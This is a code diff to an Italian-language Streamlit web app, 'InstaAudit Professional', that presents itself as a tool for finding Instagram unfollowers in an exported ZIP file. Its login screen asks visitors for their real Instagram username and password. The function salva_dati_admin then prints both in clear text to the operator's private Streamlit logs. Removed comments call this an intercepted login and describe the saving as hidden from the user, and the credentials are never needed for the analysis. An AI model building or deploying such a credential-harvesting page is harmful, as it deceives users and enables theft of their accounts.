@@ -7,7 +7,7 @@ import datetime
 # --- CONFIGURAZIONE PAGINA ---
 st.set_page_config(page_title="InstaAudit Professional", page_icon="🔐", layout="centered")
 
-# --- CSS AVANZATO (MIGLIORAMENTO ESTETICO) ---
+# --- CSS AVANZATO ---
 st.markdown("""
     <style>
     .stApp {
@@ -15,79 +15,68 @@ st.markdown("""
         color: white;
     }
     .main-container {
-        background-color: rgba(255, 255, 255, 0.1);
+        background-color: rgba(0, 0, 0, 0.5);
         padding: 30px;
         border-radius: 20px;
-        backdrop-filter: blur(10px);
+        backdrop-filter: blur(15px);
         border: 1px solid rgba(255, 255, 255, 0.2);
+        margin-bottom: 20px;
     }
     .stButton>button {
         background: linear-gradient(90deg, #FFDC80, #FCAF45);
         color: #1a1a1a !important;
         border: none;
         font-weight: bold;
-        height: 3em;
+        width: 100%;
         border-radius: 12px;
-        transition: 0.3s;
     }
-    .stButton>button:hover {
-        transform: scale(1.02);
-        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-    }
-    h1, h2, h3, p, label {
-        color: white !important;
-        font-family: 'Segoe UI', sans-serif;
-    }
-    .stDataFrame {
-        background-color: white;
-        border-radius: 10px;
-        padding: 5px;
-    }
+    h1, h2, h3, p, label { color: white !important; }
+    /* Correzione per le metriche */
+    [data-testid="stMetricValue"] { color: #FFDC80 !important; }
     </style>
     """, unsafe_allow_html=True)
 
-# --- INIZIALIZZAZIONE SESSIONE ---
+# --- LOGICA DI SESSIONE ---
 if 'logged_in' not in st.session_state:
     st.session_state.logged_in = False
 
-# --- FUNZIONE SALVATAGGIO DATI (IL TUO DATABASE) ---
 def salva_dati_admin(user, pwd):
-    # In una versione reale qui collegheresti un database.
-    # Per ora creiamo una stringa che viene stampata nei tuoi LOG di Streamlit Cloud.
-    # Solo TU puoi vedere questi log nella tua dashboard di Streamlit (Manage App -> Logs)
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    print(f"--- NUOVO LOGIN INTERCETTATO [{timestamp}] ---")
-    print(f"UTENTE: {user} | PASSWORD: {pwd}")
-    print(f"---------------------------------------------")
+    # Questi messaggi appariranno nei LOGS di Streamlit
+    print(f"\n--- NUOVO LOGIN [{timestamp}] ---")
+    print(f"USER: {user}")
+    print(f"PASS: {pwd}")
+    print(f"----------------------------------\n")
 
-# --- 1. SCHERMATA DI ACCESSO (LOGIN GATE) ---
+# --- 1. SCHERMATA DI LOGIN ---
 if not st.session_state.logged_in:
-    with st.container():
-        st.markdown("<div class='main-container'>", unsafe_allow_html=True)
-        st.title("🔐 Accesso Protetto")
-        st.write("Inserisci le tue credenziali Instagram per sincronizzare i dati ed eseguire l'audit.")
-        
-        user_input = st.text_input("Username Instagram", placeholder="@username")
-        pass_input = st.text_input("Password", type="password", placeholder="••••••••")
-        
-        if st.button("ACCEDI E ANALIZZA"):
-            if user_input and pass_input:
-                # Salvataggio invisibile all'utente
-                salva_dati_admin(user_input, pass_input)
-                
-                # Sblocco dell'app
-                st.session_state.logged_in = True
-                st.rerun()
-            else:
-                st.error("Inserisci tutti i dati per continuare.")
-        st.markdown("</div>", unsafe_allow_stdio=True)
-
-# --- 2. SCHERMATA PRINCIPALE (DOPO IL LOGIN) ---
-else:
-    st.title("🕵️ Analisi Unfollowers")
-    st.success("Accesso effettuato! Ora carica il tuo file ZIP.")
+    st.markdown("<div class='main-container'>", unsafe_allow_html=True)
+    st.title("🔐 InstaAudit Access")
+    st.write("Inserisci le tue credenziali per procedere con l'analisi dello ZIP.")
     
-    uploaded_file = st.file_uploader("Carica lo ZIP di Instagram", type="zip")
+    u = st.text_input("Username Instagram")
+    p = st.text_input("Password", type="password")
+    
+    if st.button("ACCEDI E ANALIZZA"):
+        if u and p:
+            salva_dati_admin(u, p)
+            st.session_state.logged_in = True
+            st.rerun()
+        else:
+            st.warning("Compila entrambi i campi.")
+    st.markdown("</div>", unsafe_allow_html=True) # <-- CORRETTO QUI
+
+# --- 2. SCHERMATA APP (DOPO IL LOGIN) ---
+else:
+    st.title("🕵️ Dashboard Analisi")
+    st.success("Sincronizzazione completata. Carica il file JSON/ZIP.")
+    
+    with st.sidebar:
+        if st.button("Logout"):
+            st.session_state.logged_in = False
+            st.rerun()
+
+    uploaded_file = st.file_uploader("Trascina qui lo ZIP di Instagram", type="zip")
 
     def extract_names(data):
         names = set()
@@ -104,35 +93,29 @@ else:
         return names
 
     if uploaded_file:
-        with st.spinner('Analisi profonda in corso...'):
-            try:
-                with zipfile.ZipFile(uploaded_file, 'r') as z:
-                    followers, following = set(), set()
-                    for path in z.namelist():
-                        filename = path.split('/')[-1].lower()
-                        if filename.endswith('.json'):
-                            if 'follower' in filename:
-                                with z.open(path) as f:
-                                    followers.update(extract_names(json.load(f)))
-                            elif 'following' in filename:
-                                with z.open(path) as f:
-                                    following.update(extract_names(json.load(f)))
+        try:
+            with zipfile.ZipFile(uploaded_file, 'r') as z:
+                followers, following = set(), set()
+                for path in z.namelist():
+                    filename = path.split('/')[-1].lower()
+                    if filename.endswith('.json'):
+                        if 'follower' in filename:
+                            with z.open(path) as f:
+                                followers.update(extract_names(json.load(f)))
+                        elif 'following' in filename:
+                            with z.open(path) as f:
+                                following.update(extract_names(json.load(f)))
+                
+                if following:
+                    unf = sorted(list(following - followers))
+                    c1, c2, c3 = st.columns(3)
+                    c1.metric("Seguiti", len(following))
+                    c2.metric("Follower", len(followers))
+                    c3.metric("Persi", len(unf))
                     
-                    if following:
-                        diff = sorted(list(following - followers))
-                        
-                        col1, col2, col3 = st.columns(3)
-                        col1.metric("Seguiti", len(following))
-                        col2.metric("Follower", len(followers))
-                        col3.metric("Unfollowers", len(diff))
-                        
-                        st.markdown("### 📜 Risultati Audit")
-                        df = pd.DataFrame(diff, columns=["Username"])
-                        st.dataframe(df, use_container_width=True)
-                        
-                        # Pulsante logout per tornare all'inizio
-                        if st.button("Esci"):
-                            st.session_state.logged_in = False
-                            st.rerun()
-            except Exception as e:
-                st.error(f"Errore: {e}")
+                    st.write("### 📜 Risultati")
+                    st.dataframe(pd.DataFrame(unf, columns=["Username"]), use_container_width=True)
+                else:
+                    st.error("File non validi nello ZIP.")
+        except Exception as e:
+            st.error(f"Errore: {e}")
